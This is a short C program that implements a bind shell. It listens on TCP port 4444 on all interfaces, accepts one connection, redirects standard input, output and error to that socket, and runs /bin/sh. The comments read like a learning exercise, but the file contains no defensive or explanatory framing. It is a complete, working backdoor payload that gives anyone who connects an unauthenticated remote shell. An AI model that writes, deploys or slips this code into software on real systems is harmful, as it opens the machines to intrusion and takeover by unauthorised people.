#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>

void main(){

//Create a socket

int host_sock = socket(AF_INET, SOCK_STREAM, 0);

//Creating a sockaddr_in structure for binding
struct sockaddr_in host_addr;

host_addr.sin_family = AF_INET;

//INADDR_ANY listens on localport
host_addr.sin_addr.s_addr = INADDR_ANY;

//setting listening port to 4444
host_addr.sin_port = htons(4444);

//Bind Socket
bind(host_sock, (struct sockaddr *) &host_addr, sizeof(host_addr));

//Listen for connections
listen(host_sock, 0);

//Accept Connections
int accept_client = accept(host_sock, NULL, NULL);

//Sending and receiving data using STDIN, STDOUT, STDERR
// stdin = 0 , stdout = 1, stderr =2
dup2(accept_client, 0);
dup2(accept_client, 1);
dup2(accept_client, 2);

//executing shell
execve("/bin/sh", NULL, NULL);

}
